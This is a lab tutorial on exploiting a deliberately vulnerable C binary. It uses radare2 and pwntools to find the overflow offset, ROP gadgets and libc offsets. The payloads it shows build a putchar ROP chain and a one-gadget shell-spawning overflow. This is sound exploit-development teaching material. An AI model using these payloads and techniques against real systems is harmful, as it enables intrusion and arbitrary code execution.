# Using Radare2(r2) to inspect binary and using pwntools for payload generation in ROP

We have our vulnerable binary. Do we want to know what we are against to?

Radare2 has command for this.

```shell
$ gcc -fno-stack-protector -o Overflow  Overflow.c   -g -m32
$ r2 -d Overflow
Process with PID 26246 started...
= attach 26246 26246
bin.baddr 0x565a0000
Using 0x565a0000
asm.bits 32
 -- Have you seen the latest radare2 TV spot?
[0xf76eac70]> iI
arch     x86
binsz    6117
bintype  elf
bits     32
canary   false
class    ELF32
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      true
relocs   true
relro    full
rpath    NONE
static   false
stripped false
subsys   linux
va       true
[xf76eac70]> 
```
This one command reveals some essential things about our binary. It's on x86 architecture, canaries are off, byte sequence order is Little Endian, and NX - byte is enabled etc.

This tool has many properties, but now we are using it to find some usable gadgets to generate ROP - chain. Additionally we test some tool, which helps to find suitable padding for overflowing the instructon pointer register.

## Finding the location, when instruction pointer is overflowed

This tool, called as ragg2, is included in radare2.
It is implementing De Bruijn pattern, and based on characters appearing in register at the moment of overflow, we know the size of padding.

Generating De Bruijn pattern size of 150, straight as input to Overflow program.
```shell
$r2 -d  Overflow $(ragg2 -P 150 -r)
Process with PID 24688 started...
= attach 24688 24688
bin.baddr 0x565f9000
Using 0x565f9000
asm.bits 32
 -- r2 -- leading options since 2006
[0xf7ef1c70]> dc
Starting very vulnerable program...
Printing arguments of the program: 
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAA
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x41414c41 code=1 ret=0
[0x41414c41]> wopO $(dr eip)
32
[0x41414c41]>
```

We can see that binary has buffer overflow vulnerability.
More precisely, we can override instruction pointer register after 32 characters. For next we should know, what we are going to do with that.

## Hello world!

Our binary is NX - protected, and we want to print 'Hello, word!", by exploiting vulnerability with usage of ROP - technique. 

Yes, every way of programming needs proper 'Hello, world!' example!

Shortly, return-oriented programming is literally programming the code we want to execute.

At this point, it might be still unclear, what return-oriented programming actually is in practice.

First, we need to remember how function calls are usually handled in 32 bit system.

Executing the function:

1. Push arguments to the stack
2. Push location of following instruction after function to stack (return address)
3. jump to location of function start

Now, if we remember ret2libc method, we were overflowing memory addresses in reverse order than above, therefore changing execution flow to the function in libc, with instruction to do after returning from library, and with parameters required by function.

Normally, by using only functions with parameters in ret2libc technique, execution and our control of stack is limited to two (2) function calls.

**Why?**

If we are using functions which need arguments, there will be situation, where argument and next return address have been pointed to same location in the stack. We can avoid this by modifying stack between use cases of argument and next return address.

If the stack frame is not edited, execution flow stops, as the argument is probably invalid address for next instruction.

The way how we can simply edit the stack, is to use gadget, which removes something from stack. In practice, we use this gadget every second time: as in the place of normal function, between the calls of other functions/gadgets.

Example gadget to remove top value from the stack:

> pop ebx; ret;

So, by executing this gadget, next instruction pointer could be actually the overflowed address after arguments in our payload, if function was using one argument.

Excellent another example and explanation about ROP: https://tc.gtisc.gatech.edu/cs6265/2016/l/lab07-rop/README-tut.txt

**Now back to the Hello, world! example**

Now, the basic idea to print 'Hello, world!' by using ROP technique, is to chain *putchar* method from libc as many time as we need.

We could do this by using single printf method, by putting string as input to local variable, and pass pointer of location of it to printf as argument, but it is not demonstrating ROP and maybe not so interesting.

As putchar is taking character as argument (not location of it), simple way is to put correct character each time as argument in our payload.

Between putchar calls, we need to pop this argument from the stack, so we can chain multiple calls.

The idea:

> padding + address of putchar + address of pop/ebx gadget + argument(first argment = H) .. repeat ... exit

Previously we looked for system() address with gdb. How about just section of couple instructions?

To be able to find this gadget, we can use radare2. We need to open program in debug mode, analyze it, and execute it partially, add debug symbols (dynamically loaded libraries) to area we are looking from, then finally look for gadget:

```shell
$ r2 -d ../vuln_progs/Overflow
Process with PID 10280 started...
= attach 10280 10280
bin.baddr 0x56555000
Using 0x56555000
asm.bits 32
 -- Disassemble?! No Disassemble Johnny No. 5!!!
[0xf7fd6c70]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
= attach 10280 10280
10280
[0xf7fd6c70]> dcu main
Continue until 0x56555586 using 1 bpsize
hit breakpoint at: 56555586
[0x56555586]> "/R/ pop ebx;ret;" # Looks like our vulnerable binary has no this gadget
[0x56555586]> e search.in = dbg.maps # look for dynamic libraries as well
[0x56555586]> "/R/ pop ebx;ret;"

First one to appear from the bottom:

0xf7febdff                 5b  pop ebx
0xf7febe00                 c3  ret


```

The address we are looking for, is 0xf7febdff. This is real address: generally it could be better to get offset from the start of library. If we look at the address, this is probably in libc (it actually is not, bad choice!). We could find suitable offset by just analyzing library alone, instead of analyzing it as dynamically linked to our program.

When system has ASLR enabled, we might need to create addresses dynamically, and therefore offsets are better choice, in case we know the version of libc in targeted system.

In this case, we can calculate the offset by ourself. First we need to find the start of libc in memory:

```shell
[0x56555586]> dm

0xf7dd7000 # 0xf7fac000 - usr   1.8M s r-x /lib/i386-linux-gnu/libc-2.27.so /lib/i386-linux-gnu/libc-2.27.so
0xf7fac000 # 0xf7fad000 - usr     4K s --- /lib/i386-linux-gnu/libc-2.27.so /lib/i386-linux-gnu/libc-2.27.so
0xf7fad000 # 0xf7faf000 - usr     8K s r-- /lib/i386-linux-gnu/libc-2.27.so /lib/i386-linux-gnu/libc-2.27.so
0xf7faf000 # 0xf7fb0000 - usr     4K s rw- /lib/i386-linux-gnu/libc-2.27.so 
```

This is the section, which shows libc parts in memory. We are interested about first address, which is the start. If we look now the selected memory address, it is outside of scope libc, it's from some other library. We should have scrolled more to top, to get better alternative inside from libc, so the offset we are calculating is general for libc, not for this precise system.

Let's calculate offset for this address anyway, it works at this situation:

```shell
[0x56555586]> ?X 0xf7febdff -  0xf7dd7000
214dff
[0x56555586]> 
```
Offset address would be 0x00214dff for our pop/ret gadget.

When we need the gadget address, we should just add offset to libc base address.

Next we need offset address of putchar and exit functions.

Putchar : 

```shell
[0x56555586]> dmi libc putchar
053 0x00069a30 0xf7e40a30 GLOBAL   FUNC   75 putchar_unlocked
527 0x00069920 0xf7e40920 GLOBAL   FUNC  269 putchar

[0x56555586]> 
```
Exit can be found same way. This time it is showing offset of function.

Now we have figured out all the addresses. Next we just need to create the payload.

Manually creating big payload for vulnerable program could be very laborious and error prone..

Luckily we can script it, and for even easier use, to use library designed for it: [pwntools.](https://github.com/Gallopsled/pwntools)

Example of scripting this 'Hello, world!' ROP payload and execution with python can be found [here.](../src/pwntools_example/ROP_hello.py)

Running the script should look something like this:

```shell
$ python ROP_hello.py 
[+] Starting local process '../vuln_progs/Overflow': pid 15673
[+] Receiving all data: Done (325B)
[*] Process '../vuln_progs/Overflow' stopped with exit code 64 (pid 15673)
[*] Starting very vulnerable program...
    Printing arguments of the program: 
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA     ���\xbd\xfe�
    \xff\xff\xff     ���\xbd\xfe�H��\xff     ���\xbd\xfe�e��\xff     ���\xbd\xfe�l��\xff     ���\xbd\xfe�l��\xff     ���\xbd\xfe�o��\xff     ���\xbd\xfe�,��\xff     ���\xbd\xfe� ��\xff     ���\xbd\xfe�w��\xff     ���\xbd\xfe�o��\xff     ���\xbd\xfe�r��\xff     ���\xbd\xfe�l��\xff     ���\xbd\xfe�d��\xff     ���\xbd\xfe�!��\xff     ���\xbd\xfe�
    \xff\xff\xff     ���\xbd\xfe�
    \xff\xff\xff\xff\xbd\xfe����\xff�s��
    
    Hello, world!
    
$ 
```


# Extra: Magic gadgets and x64 System

There is significant difference in x86 and x64 systems about how functions are called. In x86 system, parameters are coming usually from stack. In x64 systems, parameters are usually coming from registers.

Another major difference is on accessing read-only data. x86 is accessing with ```<reg>``` (offset from any register), where x64 is using offset from rip register (RIP-relative addressing).
Therefore data accessing is more standardized in x64.

Because of the combination of these properties in x64 systems, we might be able to find easier and larger usable code segments(gadgets) in x64 system than in x86 system.
You can find detailed example and explanation [here](https://david942j.blogspot.com/2017/02/project-one-gadget-in-glibc.html).

Naming of 'magic gadget' implies for all-in-one gadget, which fills some core functionality alone. The most common example would be single gadget from libc library, which spawns a shell.

Detailed guide for using radare2 to find this magic gadget in x64 system can be found [here](https://0xabe.io/howto/exploit/2016/03/30/Radare2-of-the-Lost-Magic-Gadget.html), but it's shortly showed here as well.

Find library:
```shell
$ ldd Overflow
	linux-vdso.so.1 (0x00007ffff7ffa000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff77e2000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000)
```

Analyze x64 libc in Ubuntu 18.04:
>r2 -A /lib/x86_64-linux-gnu/libc.so.6

Find string '/bin/sh'
```shell
[0x00021cb0]> / /bin/sh
Searching 7 bytes in [0x0-0x1e6aa0]
hits: 1
Searching 7 bytes in [0x3e7620-0x3f0ae0]
hits: 0
0x001b3e9a hit0_0 .cempty == 1-c/bin/shexit 0canonica.
```
Find reference from where it's used and loaded to rdi register:
```shell
[0x00021cb0]> axt @0x001b3e9a ~lea rdi
sub.__environ_168_eb0 0x4f329 [DATA] lea rdi, str.bin_sh
sym._IO_proc_open 0x808f1 [DATA] lea rdi, str.bin_sh
sym.execvpe 0xe565d [DATA] lea rdi, str.bin_sh
sym.execvpe 0xe569f [DATA] lea rdi, str.bin_sh
sym.execvpe 0xe580b [DATA] lea rdi, str.bin_sh
sym.execvpe 0xe5863 [DATA] lea rdi, str.bin_sh
sub.bin_sh_9c0 0x10a398 [DATA] lea rdi, str.bin_sh
(nofunc) 0x10f23f [DATA] lea rdi, str.bin_sh
[0x00021cb0]>
```
If we check all these addresses by using:
> pd 10 @'memaddr'

We can finally see, that potential address is 0x4f329

```shell
[0x00021cb0]> pd 6 @0x4f329 
|           0x0004f329      488d3d6a4b16.  lea rdi, str.bin_sh    ; hit0_0 ; 0x1b3e9a ; "/bin/sh"
|           0x0004f330      488d742440     lea rsi, [local_40h]        ; section_end.ehdr ; 0x40
|           0x0004f335      c705a1e23900.  mov dword [0x003ed5e0], 0   ; [0x3ed5e0:4]=0
|           0x0004f33f      c7059be23900.  mov dword [0x003ed5e4], 0   ; [0x3ed5e4:4]=0
|           0x0004f349      488b10         mov rdx, qword [rax]
|           0x0004f34c      e8df5a0900     call sym.execve
[0x00021cb0]> pd -2 @0x4f329 
|           0x0004f31d      e81efefeff     call sym.sigprocmask
|           0x0004f322      488b057fbb39.  mov rax, qword [reloc.__environ_168] ; [0x3eaea8:8]=0
[0x00021cb0]> pd 9 @0x4f322 
|           0x0004f322      488b057fbb39.  mov rax, qword [reloc.__environ_168] ; [0x3eaea8:8]=0
|           0x0004f329      488d3d6a4b16.  lea rdi, str.bin_sh         ; hit0_0 ; 0x1b3e9a ; "/bin/sh"
|           0x0004f330      488d742440     lea rsi, [local_40h]        ; section_end.ehdr ; 0x40
|           0x0004f335      c705a1e23900.  mov dword [0x003ed5e0], 0   ; [0x3ed5e0:4]=0
|           0x0004f33f      c7059be23900.  mov dword [0x003ed5e4], 0   ; [0x3ed5e4:4]=0
|           0x0004f349      488b10         mov rdx, qword [rax]
|           0x0004f34c      e8df5a0900     call sym.execve 
|           0x0004f351      bf7f000000     mov edi, 0x7f
|           0x0004f356      e8755a0900     call sym._exit              ; void _exit(int status)

```
From offset 0x0004f322 we get all needed instructions to spawn a shell. There is clean exit as well.

### Simple scenario to use offset
 Start program in gdb:
  > gdb -q Overflow

Add breakpoint to the start of the program. Once it reaches it:

> info proc mapping

Example:
> 0x7ffff79e4000     0x7ffff7bcb000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so


Here we can see base addresses of libraries! Let's take first one about libc and add offset to it. 

```shell
(gdb) x/10 0x7ffff79e4000+0x0004f322
0x7ffff7a33322 <do_system+1138>:	0x7f058b48	0x480039bb	0x4b6a3d8d	0x8d480016
0x7ffff7a33332 <do_system+1154>:	0xc7402474	0x39e2a105	0x00000000	0x9b05c700
0x7ffff7a33342 <do_system+1170>:	0x000039e2	0x48000000
(gdb) 
```
If we compare these hex numbers to previous instructions what we found in radare2, they are a match.

Let's overflow with gadget address:
```shell
(gdb) r $(python -c 'print "A" * 56 + "\x22\x33\xa3\xf7\xff\x7f"' )
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/nicce/Desktop/Shellcode Lab/Overflow $(python -c 'print "A" * 56 + "\x22\x33\xa3\xf7\xff\x7f"' )
process 16576 is executing new program: /bin/dash
$ exit
[Inferior 1 (process 16576) exited normally]
(gdb)
```
Shell was spawned and exit was clean.

> -- What is the most complex r2 command? q - then you have to deal with real life /o\

